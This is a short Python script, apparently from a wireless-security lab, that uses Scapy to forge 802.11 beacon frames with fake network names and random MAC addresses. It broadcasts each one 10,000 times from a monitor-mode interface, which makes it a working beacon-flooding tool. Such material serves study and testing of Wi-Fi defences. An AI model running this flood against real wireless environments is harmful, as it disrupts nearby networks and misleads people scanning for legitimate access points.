# Julien Huguet & Antoine Hunkeler

from scapy.all import *
import random
import string

filename = 'ssid.txt'
interface = 'wlan0mon'

# From : https://gist.github.com/pklaus/9638536
# Function that allows to generate random MAC address
def randMac():
	return "%02x:%02x:%02x:%02x:%02x:%02x" % (
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255)
        )

# Function that allows to generate a randomly fake SSID with numbers and letters
def randSSID(length):
	letters = string.ascii_lowercase
	digits = string.digits
	return ''.join(random.choices(letters + digits, k=length))

# Generate random MAC address for source and access point MAC address
randAddr2 = randMac()
randAddr3 = randMac()

# inspiring from here : https://www.geeksforgeeks.org/read-a-file-line-by-line-in-python/

# if the file exists in the same path of this script
if os.path.isfile(filename):
	fileSSID = open('ssid.txt', 'r') # open this file in read mode
	lines = fileSSID.readlines() # read all lines

	# for every line
	for line in lines:
		# display fake SSID in line, forge a 802.11 beacon frame with fake SSID and random MAC addresses
		print("SSID : {}".format(line.strip()))
		dot11 = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=randAddr2, addr3=randAddr3)
		beacon = Dot11Beacon()
		essid = Dot11Elt(ID='SSID', info=line, len=len(line))

		frame = RadioTap()/dot11/beacon/essid
		
		# send the forged beacon frame 10000 times on the specified interface
		sendp(frame, count=10000, iface=interface, verbose=1)

# else if the file does not exist
else:
	# ask user how many fake SSIDs to generate
	nbFakeSSID = int(input("Enter the number of fake SSIDs : \n"))	
	
	# https://stackoverflow.com/questions/2030053/random-strings-in-python
	# depending the number entering by user
	# generate a fake SSID and forge a 802.11 beacon frame
	# and send 10000 times on the specified interface
	for i in range(nbFakeSSID):
		fakeSSID = randSSID(10)
		print(fakeSSID)
		dot11 = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=randAddr2, addr3=randAddr3)
		beacon = Dot11Beacon()
		essid = Dot11Elt(ID='SSID', info=fakeSSID, len=len(fakeSSID))
		frame = RadioTap()/dot11/beacon/essid
		sendp(frame, count=10000, iface=interface, verbose=1)
